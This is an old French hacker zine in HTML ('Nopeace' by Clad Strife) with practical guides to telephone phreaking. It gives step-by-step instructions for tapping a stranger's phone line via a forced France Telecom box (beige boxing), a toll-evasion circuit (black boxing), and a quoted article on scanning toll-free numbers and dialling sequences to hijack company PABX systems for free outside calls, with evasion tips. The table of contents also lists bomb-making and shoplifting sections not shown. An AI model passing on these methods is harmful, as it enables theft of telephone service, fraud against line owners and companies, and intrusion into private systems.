<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
<html>
<head>
   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
   <meta name="Author" content="Bill G.">
   <meta name="GENERATOR" content="Mozilla/4.61 [en] (Win98; I) [Netscape]">
   <title>Nopeace --- By Clad Strife</title>
</head>
<body text="#FFFFFF" bgcolor="#000000" link="#FFFFFF" vlink="#551A8B" alink="#FF0000">

<center><font color="#FF0000"><font size=+4>Nopeace</font></font>
<br><u><font color="#33CCFF">Nopeace v1.1 &eacute;crite par Clad Strife</font></u></center>

<br>&nbsp;
<ul>
<li>
<font color="#FFFFFF">Sommaire:</font></li>
</ul>

<ol>
<li>
<font color="#FFFFFF">Phreaking: Beige Boxing</font></li>

<li>
<font color="#FFFFFF">Phreaking: Black Boxing</font></li>

<li>
<font color="#FFFFFF">Phreaking: le Blue Boxing</font></li>

<li>
<font color="#FFFFFF">Phreaking: Carding</font></li>

<li>
<font color="#FFFFFF">Phreaking: PABX/VMB</font></li>

<li>
<font color="#FFFFFF">Phreaking: les bornes France Telecom</font></li>

<li>
<font color="#FFFFFF">Phreaking: Avoir de l'&eacute;lectricit&eacute; gratos</font></li>

<li>
<font color="#FFFFFF">Anarchie: Faire des bombes</font></li>

<li>
<font color="#FFFFFF">Anarchie: Voler dans les grandes surfaces</font></li>

<li>
<font color="#FFFFFF">Anarchie: Foutre le bordel au niveau de l'&eacute;lectricit&eacute;</font></li>

<li>
<font color="#FFFFFF">Anarchie: Phoner gratos, voyager gratos</font></li>

<li>
<font color="#FFFFFF">Programmation: Comment cr&eacute;er de dangereux
fichiers MS-DOS, les fichiers.bat</font></li>

<li>
<font color="#FFFFFF">Programmation: Quelques codes sources en Basic</font></li>

<li>
<font color="#FFFFFF">Hacking: les failles WinGate</font></li>

<li>
<font color="#FFFFFF">Conclusion et r&eacute;f&eacute;rences</font></li>
</ol>
<b><u><font color="#FFFF00">Avertissement!!!</font></u></b><font color="#FFFFFF">
Je ne peux &ecirc;tre tenu responsable de ce que vous ferez de mes infos!
En effet, elles ne sont mises &agrave; votre disposition qu'&agrave; titre
PUREMENT &eacute;ducatif! Vous ne pouvez en aucun cas m'incriminer de vos
actes, moi ou mon provider, de quelque fa&ccedil;on que ce soit!!! Si vous
tuez votre grand-m&egrave;re avec une bombe ce sera pas ma faute... de
la m&ecirc;me fa&ccedil;on que je ne mets ces infos ici que dans le but
de pr&eacute;venir les &eacute;ventuels dangers qui pourraient subvenir
au cas ou quelqu'un s'en serviraient! On explique &agrave; la t&eacute;l&eacute;vision
comment se procurer des armes, ce n'est pas pour autant que vous vous vous
en procurez! Sur ce, bonne lecture!</font>
<center>
<p><b><font color="#FF0000"><font size=+3>Le Beige Boxing</font></font></b></center>
<font color="#FFFFFF">&nbsp;&nbsp; Le Beige Boxing, consiste &agrave; pirater
une ligne t&eacute;l&eacute;phonique en se branchant sur une ligne t&eacute;l&eacute;phonique
qui ne nous appartient pas pour &eacute;viter de payer! Explications sur
l'affaire pour ceux qui y pigent que dalle: Vous avez un t&eacute;l&eacute;phone,
et une prise qui relie ce t&eacute;l&eacute;phone au mur de votre pi&egrave;ce.
Regardez cette prise: elle est compos&eacute;e de 3 lamelles grises, c'est
par l&agrave; que va passer le courant et le signal. D'accord? Donc en
d&eacute;montant cette prise l&agrave;, vous verrez apparaitre 2 fils,
ces 2 fils l&agrave; nous int&eacute;resse...</font>
<br><font color="#FFFFFF">Mat&eacute;riel &agrave; avoir:</font>
<br><font color="#FFFFFF">2 pinces crocodiles</font>
<br><font color="#FFFFFF">de l'&eacute;tain</font>
<br><font color="#FFFFFF">de quoi faire une soudure</font>
<br><font color="#FFFFFF">un tournevis</font>
<br><font color="#FFFFFF">un t&eacute;l&eacute;phone standard...</font>
<br><font color="#FFFFFF">et un cutter.</font>
<br><font color="#FFFFFF">Bon, il s'agit de trouver maintenant les fils
qui partent d'une maison ou d'un immeuble, FAITES ATTENTION QUE CE NE SOIENT
PAS DES FILS ELECTRIQUES. Pour rep&eacute;rer si tel est le cas regardez
si les fils sont raccord&eacute;s &agrave; des pylones en bois, ou partent
dans le sol... Evitez de toucher aux fils souterrains, et cherchez plut&ocirc;t
une borne FT qui serait sur un pylone, sur le mur d'une maison, immeuble,
etc.... Alors donc cherchez ces boitiers marqu&eacute;s FT ou tout simplement
un fil noir assez gros descendant des pilones en bois, et d&eacute;foncez
les (les boitiers pas les pilones), juste pour les ouvrir. Faites &ccedil;a
de pr&eacute;f&eacute;rence le jour, vers les 6 ou 7 heures du mat en faisant
un minimum de bruit. Bon assurez vous que personne ne vous a, ou n'a pu
vous rep&eacute;rer et d&eacute;nudez le fil noir &agrave; l'aide de vottre
cutter. Ce fil noir fait 0,5cm de diam&egrave;tre ou un peu plus, une fois
d&eacute;nud&eacute; vous rentrez chez vous pour souder vos pinces crocodiles
aux files de la prise du t&eacute;l&eacute;phone, n'oubliez pas de replacer
en partie le boitier pour que &ccedil;a soit pas trop visible que vous
avez d&eacute;fonc&eacute; la boite FT... Okay c'est fait? Bon Il n'y a
plus qu'&agrave; attendre que la nuit se l&egrave;ve. Il devrait &ecirc;tre
entre 23h00 et 1h00 du mat quand vous irez retrouvez votre fil noir d&eacute;nud&eacute;...
En ayant pris soin de faire un minimum de bruit vous allez brancher vos
pinces crocodiles sur les fils d&eacute;passant de la partie d&eacute;nud&eacute;e...
Bon vous avez bien entendu une lampe de poche avec vous. Okay, vous n'avez
plus qu'&agrave; faire diff&eacute;rents branchements dans le cas o&ugrave;
il n'y aurait pas de tonalit&eacute;! Assurez vous de la qualit&eacute;
de vos branchements pour pas que tout d&eacute;croche au dernier moment!
de l&agrave; appellez qui vous voulez: pas un pote qui vous reconnaitrait,
plut&ocirc;t les r&eacute;seaux ou une pizzeria encore ouverte.</font>
<br><font color="#FFFFFF">Evitez de revenir sur le lieu du litige trop
souvent: le mec dont vous avez d&eacute;tourn&eacute; la ligne telephone
finirait par s'en rendre compte.</font>
<center>
<p><b><font color="#FF0000"><font size=+3>Le Black Boxing</font></font></b></center>

<p><br>
<p><font color="#FFFFFF">&nbsp;&nbsp; Certains consid&egrave;rent le Black
Boxing comme un mythe de banlieue, en fait &ccedil;a a march&eacute; &agrave;
une &eacute;poque en France, mainteant FT surveille &agrave; peu pr&egrave;s
tout. Mais le Black Boxing marche dans une partie des Etats-Unis tr&egrave;s
certainement. Nous allons expliquer comment faire du Black Boxing.</font>
<br><font color="#FFFFFF">Mat&eacute;riel &agrave; avoir:</font>
<br><font color="#FFFFFF">1 LED</font>
<br><font color="#FFFFFF">1 r&eacute;sistance 1,8 Kohm O,5whatt</font>
<br><font color="#FFFFFF">1 t&eacute;l&eacute;phone, avec le fil et la
prise t&eacute;l&eacute;phone</font>
<br><font color="#FFFFFF">1 interrupteur On/Off</font>
<br><font color="#FFFFFF">Donc voici ce que vous avez: Vous avez la prise
reli&eacute;e au mur et entre la prise et le t&eacute;l&eacute;phone, vous
aurez pris soin d'installer sur le fil votre Box. Pour la faire il faut
avoir install&eacute; la led et l'interrupteur &agrave; la suite mais en
d&eacute;rivation sur un des fil t&eacute;l&eacute;phonique de la ligne</font>
<br><font color="#FFFFFF">Une fois ce montage fait, lorsque vous avez branch&eacute;
votre montage et que quelqu'un vous appelle enclenchez l'interrupteur sur
On, et le mec &agrave; l'autre bout ne payera pas.</font>
<br><font color="#FFFFFF">Alors attention vous encourez des risques: FT
connait ce genre de magouilles alors si vous essayez et que vous vous faites
choper...</font>
<center>
<p><b><font color="#FF0000"><font size=+3>Le Blue Boxing</font></font></b></center>

<p><br>
<p><font color="#FFFFFF">&nbsp;&nbsp; Le Blue Boxing a &eacute;t&eacute;
le premier syst&egrave;me de Boxing cr&eacute;&eacute; dans les ann&eacute;es
1960 par des &eacute;tudiants du MIT. D&eacute;velopp&eacute; par le capitain
crunch le Blue Boxing consiste &agrave; appeler un N&deg; vert et leur
faire croire que la ligne est libre en &eacute;mettant un son. A partir
de l&agrave; on peut appeler n'importe o&ugrave; gratuitement. Bien entendu
chaque pays disposent de Boxies diff&eacute;rentes car les syst&egrave;mes
y sont diff&eacute;rents. En tout cas en france ce syst&egrave;me ne marche
plus depuis 1992, mais en france seulement. Attquez vous donc aux syst&egrave;mes
&eacute;trangers. Pour faire du BB on utilise des programmes: BlueBeep,
Scavenger, TLO, Bluedial, etc...</font>
<center>
<p><b><font color="#FF0000"><font size=+3>Le Carding</font></font></b></center>

<p><br>
<p>&nbsp;&nbsp; Cette m&eacute;thode consiste &agrave; recharger sa carte
magn&eacute;tique qui est hors service par manque d'unit&eacute;s, &agrave;
l'aide d'une autre carte magn&eacute;tique pleine. Cette m&eacute;thode
ne marche pas pour les cartes &agrave; puces, car la puce s'auto-d&eacute;t&eacute;riore
en cas d'essais de carding. Mais quelqu'un a r&eacute;ussi &agrave; le
faire! Pas croyable. Explications:
<br>Ce gars l&agrave; il a 35 ans, il s'appelle Serge, et il a r&eacute;ussi
&agrave; cracker les cardes de cr&eacute;dits. Il n'a pas enlev&eacute;
la protection comme le font les crackers, il l'a d&eacute;tourn&eacute;.
Avec beaucoup d'intelligence et du matos, il a fait des cartes reconnues
comme vraies, et donc utilisables partout quelque soit le code tap&eacute;!!
Bref toujours est-il que maintenant on a r&eacute;utilis&eacute; le mot
carding pour d&eacute;crire la cr&eacute;ation de fausses cartes de paiement
sur le Net.
<center>
<p><b><font color="#FF0000"><font size=+3>PABX/VMB</font></font></b></center>

<p><br>
<p><font color="#FFFFFF">&nbsp;&nbsp; Des r&eacute;seaux t&eacute;l&eacute;phoniques
internes utilis&eacute;s par certaines entreprises dans lesquels une intrusion
est facilement possible. Le PABX, c'est en g&eacute;n&eacute;ral une centrale
d'aiguillage informatis&eacute;e qui permet</font> &agrave; une &eacute;norme
quantit&eacute;s de lignes d'&ecirc;tres g&eacute;r&eacute;es informatiquement.
On peut s'y adresser de plusieurs fa&ccedil;ons: par l'int&eacute;rieur
(via un PC, VAX, Terminal) ou par l'ext&eacute;rieur: telephone, modem.
Une VMB est une boite vocale, c'est une sorte de r&eacute;pondeur qui vous
permet de recevoir des messages et d'en envoyer &agrave; d'autres correspondants.
Mais pour cela, il faut que les correspondants soient sur le m&ecirc;me
serveur (la plupart des grosses entreprises en poss&egrave;dent une). Une
PABX a souvent la possibilit&eacute; de se commuter sur le r&eacute;seau
externe de l'entreprise. C'est ce qu'on appelle un outdial (parfois d&eacute;tournable).
<br>Article tir&eacute; de Noroute1#:
<br>1: C'est quoi un PABX ?
<p>&nbsp; Un PABX (Private Automatic Branch Exchanger) est en fait un central
telephonique qui gere les appels entrants est sortants. Il gere le reseau
interne aussi bien que le reseau externe. Pour vous donner un exemple:
Mr Lamer travail chez Grolame &amp; Co. Monsieur Lamer veut telephoner...
Pour cela, il decroche son telephone, il appuie sur `0' puis il compose
son numero. Voila en gros a quoi un PABX peut servir.
<p>&nbsp; Bon on y va alors. A quoi ca peut bien vous servir de savoir
que Mr Lamer lamer peut phoner depuis son poste en faisant le 0' ??? D'abord
vous devez comprendre a quoi ca ressemble un PABX.
<p>&nbsp; o Chaque employe a un poste bien a lui, OK ?
<br>&nbsp; o Chaque employe a une ligne directe (surement), OK ?
<br>&nbsp;&nbsp;&nbsp; (surement car le PABX ne servirait a rien sinon,
eh!).
<br>&nbsp; o Tous les employes sont relie au PABX.
<p>&nbsp; Bon voyons de plus pres comment ca marche maintenant: vous appelez
le PABX. Ensuite, une fois dans le PABX, vous pouvez etre redirige entre
les differents postes ou services (les 4 derniers chiffres du numeront
correspondent au numero du poste, par exemple 12 12 + numero de poste,
comme 0003). 12 12 00 03 c'est bon, vous avez compris, et je vous vois
dire que c'est facile une fois qu'on connait les 4 premiers chiffres. C'est
les memes que ceux de l'entreprise. Ex: voici le numero de l'entreprise
Grolame &amp; Co, 12 12 00 05. Vous savez maintenant qu'il faut mettre
12 12 + &lt;numero de poste> pour avoir le numero de la ligne directe de
l'employe (attention, les PABX en numeros verts ne fonctionnent pas pareil,
vous n'avez pas de ligne direct dans ce cas la).
<p>&nbsp; Bon, voici la theorie...
<br>&nbsp; Pour detourner les PABX a son avantage, vous avez plusieurs
choix:
<p>&nbsp; o Soit vous vous connectez par la ligne directe de l'employe,
et une fois
<br>&nbsp;&nbsp;&nbsp; le contact telephonique etabli, vous vous trouvez
exactement a la place
<br>&nbsp;&nbsp;&nbsp; de l'employe et donc vous pouvez ici tester les
differentes methodes
<br>&nbsp;&nbsp;&nbsp; (exposees plus loin) pour essayer de faire un outdial.
<br>&nbsp; o Sinon, vous vous connectez directement au PABX en composant
le numero du
<br>&nbsp;&nbsp;&nbsp; poste ou vous voulez aller. Ex: lorsque vous etes
sur la "tone" interieure
<br>&nbsp;&nbsp;&nbsp; du PABX (ou le service qui vous met en contact avec
un poste
<br>&nbsp;&nbsp;&nbsp; automatiquement), vous composez le numero du poste
ou le PABX va vous
<br>&nbsp;&nbsp;&nbsp; router. Pour etre plus clair, lors du "Booooooooooooooo",
faites le
<br>&nbsp;&nbsp;&nbsp; numero de poste ou vous voulez aller, comme 00 03
par exemple, et une
<br>&nbsp;&nbsp;&nbsp; fois le numero compose, vous vous retrouvez a la
meme position que l'
<br>&nbsp;&nbsp;&nbsp; employe au poste xx xx et donc comme lui vous pouvez
appeler l'exterieur !
<p>&nbsp; Vous avez surement remarque le "poste fictif". Certains PABX
utilisent unposte dit fictif pour appeler l'exterieur.
<p>&nbsp; Voila pour la theorie...
<p>2: Ca se deroule comme ca !
<p>&nbsp;&nbsp; 1. Trouver un PABX.
<br>&nbsp;&nbsp; 2. Comprendre de quelle famille est le PABX.
<br>&nbsp;&nbsp; 3. Trouver la facon de faire un Outdial.
<br>&nbsp;&nbsp; 4. Abuser du PABX.
<br>&nbsp;&nbsp; 5. Les conneries que l'on dit sur les PABX.
<br>&nbsp;&nbsp; 6. Disc-lamer :)).
<p>2.1: Partons a la quete du PABX
<br>&nbsp;&nbsp; Pour ceux qui aurait lu mon article sur les VMB, ils reconnaitront
des extraits de cet article. Oui, c'etait parfait, et je vois pas pourquoi
je l'ecrirai de nouveau :)
<p>2.1.1 Trouver un numero (scanner les PABX a partir de 9h) Pour trouver
un numero vert qui est susceptible d'avoir un PABX sans scanner pendant
des jours, il faut faire les numero avec methode:
<p>&nbsp; o Faites des numeros du genres 0800 XAB XAB.
<br>&nbsp;&nbsp;&nbsp; ex: 0800 140 140 ou 0800 120 120
<br>&nbsp; o Il y'a les numero du genre 0800 AB XC XC.
<br>&nbsp;&nbsp;&nbsp; ex: 0800 50 20 20
<br>&nbsp;&nbsp;&nbsp; (vous incrementerez les numero XC de +1, ex: 0800
50 20 20, 0800 50 21 21)
<br>&nbsp; o Puis vous avez les numero du genre 0800 41 42 43 ou 0800 43
42 41
<br>&nbsp;&nbsp;&nbsp; (qui s'incremente ou se decremente)
<br>&nbsp; o Puis ceux du genre 0800 XA XC XB.
<br>&nbsp;&nbsp;&nbsp; ex: 0800 30 31 35 ou 0800 40 47 45 etc...
<p>&nbsp; Bref, tous les numeros qui sont faciles a memoriser ! OK ?
<p>&nbsp; --> Pour ceux qui n'ont pas le courage de faire ca a la main,
et bien vous feriez mieux de faire autre chose ;) Fermons la la parenthese
:)
<p>&nbsp; Bon ca *sonne* ! Mais maintenant, je fais quoi ?
<br>&nbsp; Tu te tais et tu ecoutes.
<p>&nbsp; o Si c'est une femme, c'est pas bon.
<br>&nbsp; o Si c'est un repondeur, OK, ca peut etre un PABX.
<br>&nbsp; o C'est une messagerie vocale. Bon, on va voir, il y a peut-etre
un PABX.
<br>&nbsp; o Ca vous demande un code confidentiel ? C'est un PABX ! :)
<br>&nbsp; o Ca dit rien... Strange ! Mais on garde, ca peut etre un PABX.
<p>&nbsp; Bon, ensuite, vous trouverez par vous-meme si c'est des PABX
ou pas.
<p>&nbsp; Ok, maintenant qu'on a un numero susceptible d'etre un PABX on
fait quoi ? (tu passes a l'etape suivante)
<p>2.2 La famille du PABX
<p>&nbsp; Maintenant que tu as un numero, essaye la touche `0'. Si ca fait
"booooooo", c'est bon, c'est un PABX. Si ca marche pas avec la touche `0',
essaye avec `#', `*', `9' ou `1'. Quand tu tombes sur la tone "booooooo",
c'est bon. Si rien marche, essaye la sequence de touches `0*'. Si ca marche,
c'est que c'estun PABX Meridian. Si ca demande un code confidentiel, tapes
rien et lis ce qui va suivre !
<p>2.3 Faire un Outdial
<p>&nbsp; Exemple de PABX qui fait "booooooooo": 0800 397 397. Bon, il
faut maintenant se connecter sur un poste (vous savez tous bien sur comment
trouver un numero de poste !). Maintenant que tu as le "booooooo" qui te
tape sur le systeme, compose le numero de poste ou tu veux aller, et tu
tomberas sur le greeting de l'employe, qui t'invite a laisser un message.
Mais toi, tu vas pas laisser un message, tu fais donc le `0'.
<p>&nbsp; 1. Tu vas retomber sur le "Booooooooooo" (c'est la tone interieure
du PABX). Bon maintenant, essaye de faire le `0' puis fais le numero que
tu veux faire (fais le 14 par exemple comme ca tu verras ou se trouve le
PABX). Si ca marche pas, essaie toutes les methodes suivantes:
<p>&nbsp;&nbsp;&nbsp; o 00 + ton numero
<br>&nbsp;&nbsp;&nbsp; o 1 + ton numero
<br>&nbsp;&nbsp;&nbsp; o 11 + ton numero
<br>&nbsp;&nbsp;&nbsp; o 9 + ton numero
<br>&nbsp;&nbsp;&nbsp; o 99 + ton numero
<br>&nbsp;&nbsp;&nbsp; o Si ca marche toujours pas, essaye de 1 a 9.
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ex: # 5 + numero (des fois, il faut
doubler l'indicatif. La, dans l'
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exemple, c'est le 5 l'indicatif).
<br>&nbsp;&nbsp;&nbsp; o Bon, si ca marche toujours pas, essaye de le faire
sans le `*' devant.
<br>&nbsp;&nbsp;&nbsp; o Recommence en 1 mais avec le # avant l'indicatif.
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ex: # + 0 + numero
<br>&nbsp;&nbsp;&nbsp; o Sinon, autre technique: faites le numero du standard
+ numero.
<br>&nbsp;&nbsp;&nbsp; o Ca marche toujours pas ? Essaye de faire un numero
de poste puis l'
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; indicatif, puis ton numero (numero de
poste = numero de VMB, donc ce
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; serait pas mal de lire mon autre article
sur les VMB, ou tout autre qui
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; vous expliquera comment avoir une VMB).
Bien sur, vous pouvez essayer
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; au pif, et surtout les numeros commencant
par 4.
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ex: (4410 + 1 + XX XX XX XX XX), ou
4410 = numero de poste
<br>&nbsp;&nbsp;&nbsp; o Argh ! Ca marche encore pas ? Essaye de le faire
en changeant l'
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; indicatif 1 ou 9 ou 0. Double pour voir
si ca marche pas (sur certains
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PABX, il faut faire # + numero de poste
+ indicatif + numero).
<p>&nbsp; Bon la si rien ne se passe, c'est qu'il faut composer un numero
de poste
<br>special.
<p>* Pour faire les outdial.
<br>&nbsp; (une fois sur la tone "booooo", vous pouvez appeler un poste
de la boite en composant son numero). La, une seule facon de le trouver,
c'est de faire les numeros un par un, en sachant que quand ca vous raccroche,
c'est que le dernier numero que vous avez compose n'est pas bon.
<p>&nbsp; Ex: '4' c'est bon la, ca a pas raccroche ou sonne au standard.
Puis je fais le `9'. La, ca sonne ou ca raccroche, c'est que le 9 n'etait
pas le bon chiffre. Donc, rappelez, faites le `4' car vous savez qu'il
est valide, recommencez avec un autre chiffre que le `9' car vous savez
qu'il est pas bon. Bon, si vous avez scanne tous les numeros et que vous
avez rien trouve, c'estpas la peine, ca doit etre un PABX ou on ne peut
pas faire d'outdial. :( (attention, certains PABX vous permettent de faire
un outdial en composant votre votre indicatif + numero dans une boite vocale.
Certains se font meme
<br>carrement lorsque vous laissez un message, donc vous devez laisser
un message apres le BiiiiiP. Faites votre indicatif + numero (des fois,
faites le '#' devant l'indicatif)
<p>&nbsp; Cas des PBX Meridian
<br>La, je laisse parler Easy-Hacker de N0WaY (il aime les Meridian). J'ai
rajoute des precisions. Un numero de Meridian: 0800 153 153.
<p>&nbsp;-=)> NT Meridian Mail &lt;(=-
<br>--------------------------------
<br>&nbsp;&nbsp;&nbsp;&nbsp; 0n les reconnait tres aisement a la voix de
la nana qui prononce les messages enregistres et aux messages qui, en dehors
du message d'accueil, sont toujours les memes. N'etant pas une solution
sur PC et etant cense etre pret a l'utilisation en quelques dizaines de
minutes, les VMB meridian offrent toutes les memes commandes et l'arborescence
differe tres peu de l'une a l'autre.
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; L'arbo classique est la suivante:
lorsque vous appellez, vous etes confrontes a un repondeur des plus classiques,
vous laissez votre message et vous vous cassez. Si vous etes un peu curieux,
vous tripotez les touches *,0 et # jusqu'a tomber sur le message jouissif:
<p>&nbsp;&nbsp;&nbsp; "Vous avez obtenu un service automatise qui vous
mettra en relation avec le numero compose. Veuillez entrer le nom ou le
numero de la personne desiree suivit de la touche #"
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; En France, et pour rester compatible
avec ce que nous avons evoques
<br>plus haut (ligne directe=(z)abpq+numero de poste), les numeros de postes
(qui sont aussi les numeros des bals sur la VMB) sont sur 4 chiffres. En
regle generale, entre 0 et 9 se trouvent des trucs particuliers comme le
standard, le fax ou l'acces aux reseaux internes. Le 0 est toujours le
standard, ou plus exactement le numero d'aide (car il est possible de le
changer comme nous le verrons plus tard). Donc bref quand on a ce message,
il suffit de composer le numero du poste puis # et hoplaboum ca dit allo
dans l'poste.
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Si vous preferez une version americaine
du "allo", trois cas possibles:
<p>###########################################################################
<br># ATTENTION: vous devez etre poste sur un vrai numero de poste.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
#
<br># Si vous le faites directos, vous ne pourrez pas dans la plupart des
cas #
<br># faire des outdial (lisez mon article sur les VMB pour plus d'infos)&nbsp;&nbsp;&nbsp;&nbsp;
#
<br>###########################################################################
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
1) Il suffit de faire un indicatif sur un chiffre pour avoir l'exterieur.
Cet indicatif est souvent 0,1 ou 9. Suit alors le numero de telephone puis
la touche #. Si vous avez le message "Il est impossible d'obtenir ce numero
a partir de ce service" c'est pas le bon indicatif, mais
<br>ca ne signifie pas pour autant que le PBX est grille. Attention, certaines
lignes peuvent etre en acces restreint (interdiction du 19 et du 36). Tiens
j'en profite pour ajouter une petite precision importante. Il est possible
d'appeller quelqu'un a partir de son nom en faisant 11 puis son nom
<br>converti en chiffres (ca se trouve encore sur les telephones ca ?),
puis le #. Kwel sauf que si l'indicatif d'outdial est le 1, lorsque vous
voulez appeller la province ou l'etranger, ca donne 119 ou 116 et cet abruti
de PBX croit que vous voulez appeller quelqu'un par son nom. Les PBX qui
choisissent mal leur indicatif sont donc assez limitees, mais ca depanne
pour Transpac.
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
2) L'acces a l'exterieur n'est possible qu'en appellant une ligne de transit,
representee par un numero de poste classique. En clair, il faut alors composer
un numero de poste sur 4 chiffres, #, et si on tombe sur une tonalite,
on peut enfin tester indicatif d'outdial+numero (plus besoin de
<br>faire #, tout ce que vous composez est envoye en direct sur la ligne
de transit). Ces lignes de transit sont souvent utilisees pour la telesurveillance
informatique (n'esperez pas en trouver le numero sur le 11).
<p>##############################################################################
<br>################ vous trouverez d'autre methode sur mon article sur
les VMB###
<br>##############################################################################
<p>:les pabx avec un acces par code
<br>ex: 0800 00&nbsp; 2002
<br>un autre cas se sont les pabx a code confidentielle souvent je dis
souvent
<br>les 2 premiers chiffre sont les meme ex: 44 xx ou 55 xx
<br>&nbsp;
<br>&nbsp;
<p>4. ABUSONS DU PBX
<p>&nbsp; La votre serviteur vous laisse faire :)
<br>&nbsp; Sachez toutefois qu'il vaut mieux l'utiliser la nuit. Si vous
n'avez pas
<br>trouve de PABX, sachez que les PABX en numero vert plus durs a hacker
:)
<br>&nbsp; Enfin, ne phonez pas pendant 12 heures a votre cousine en Islande.
Non
<br>seulement, c'est trop gros et sachez que si vous mettez 120 000F de
bill a la
<br>boite, ca risque de vous attirer des problemes...
<p>5. LES CONNERIES QUE L'ON A DIT SUR LES PABX
<p>*&nbsp; Oui, les PABX savent notre numero de telephone !
<br>&nbsp;&nbsp; Non les PABX n'affichent pas votre numero de telephone
sauf si vous avez
<br>un ligne Numeris (on peut demander a avoir l'anonymat)
<p>*&nbsp; Les PABX, c'est hyper trace !
<br>&nbsp;&nbsp; Arretons le massacre il y'a pas un tracer sur chaque PABX.
Ici, chez FT,
<br>le phreaking ils sont pas trop atteints, c'est pas comme chez Sprint
ou MCi
<p>*&nbsp; Les PABX ca marche pas !
<br>&nbsp;&nbsp; Ha ha! Il est vrai que les PABX sur numero vert sont durs...
<p>*&nbsp; Oui, mais moi je veux un PABX maintenant, la, en 38 secondes
maxi.
<br>&nbsp;&nbsp; Fais le 36 15 La Reboute
<p>*&nbsp; Oui mais moi, je fais du warez et je veux rien savoir.
<br>&nbsp;&nbsp; Moi je joue a Quake sur 486, je phreak avec mes doigts
et je lance mes
<br>casseurs de password sur des gros Cray ! Hacking roue-laisse (ca fait
bien
<br>de dire rulez :)
<br>&nbsp;
<p>*&nbsp; Stop le delire CoD4, je te crois est je m'en vais retourner
au warez.
<br>&nbsp;&nbsp; Arg!! :)
<br>&nbsp;
<p>6. DISC-LAMER
<p>T7HS (the 7th hacker's society)
<br>(si ton nom y figure pas, il y'a bien une raison !!!)
<p>Salut a Morgan pour son aide tres precieuse.
<p>Special dedicace (l'autres est zi-va) a:
<p>&nbsp;o LARSEN HVU vaincra !
<br>&nbsp;o Tous les membres du T7HS est tous ceux de #HACKFR
<br>&nbsp;o a LOGINZ, ^mars, scud, pegase, kikoo (qui m'a dit d'aller a
la FAC),
<br>&nbsp;&nbsp; |ouyshla| et a tous les membres de PhE! (#PHe).
<p>Et le MEGA BIG UP pour France Telefarce ;)
<br>Et hop!, un peu de pub pour mon channel: #warez-FFT
<p>Allez voir sur #warez-france pour me trouver, ou sur #hackfr
<p>Vala, c'est tout. Bye !
<p>COD4 phreaking ROUX-LAIZE !!!
<br>&nbsp;
<p>[SI...]
<p>&nbsp; Si tu est phreaker pro, contacte-moi, j'ai encore a apprendre.
<br>&nbsp; Si quelqu'un a des rajouts a faire, ou des critiques, des idees,
ce serait
<br>bon qu'il me donne son avis.
<br>&nbsp; Si votre pere travaille chez F.T ou vous meme et que vous avez
des infos
<br>ou des des docs, contactez-moi !
<br>&nbsp; Si vous installez des PABX, que vous dormez avec le standard
et non pas avec
<br>la standardiste, re-contact me !
<p>--> Recherche un pro du cellulaire et un pro de la box. Merci.
<p>*******************
<br>*/~*/~\*|\**|\**/**
<br>*\_*\_/*|/**|*\/***
<br>*******************
<p>H/P ROULE-ASS
<p>##############################################################################
<br>&nbsp; COD4 COD4 COD4 COD4 COD4 COD4 COD4 COD4 COD4 COD4 COD4 COD4
COD4 COD4 COD4
<br>##############################################################################
<br>&nbsp;
<p>NoTe: j'ai corrige les fautes d'orthographe, la mise en page et tout,
et je
<br>peux vous dire qu'y avait du boulot ;). Si vous voulez contacter CoD4,
vous
<br>pouvez toujours laisser un mail sur la boite du groupe, je transmettrai:
<br>phe@mygale.org
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-- HoTCoDe, PhE!.
<br>il a raison [CoD4]
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _______&nbsp; __&nbsp;&nbsp;
__ ______
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp; _&nbsp;&nbsp; \|&nbsp;
|_|&nbsp; | _____|&nbsp;&nbsp;&nbsp;&nbsp; H/P French Group !
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp; |_)&nbsp;&nbsp; |&nbsp;&nbsp;
_&nbsp;&nbsp; | ____|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; http://www.mygale.org/02/phe
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp; ___/|__| |__|______|&nbsp;&nbsp;&nbsp;&nbsp;
phe@mygale.org
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |___|THe PHiLaMeNT eMPiRe
<p>-------------------------------------------------------------------------------
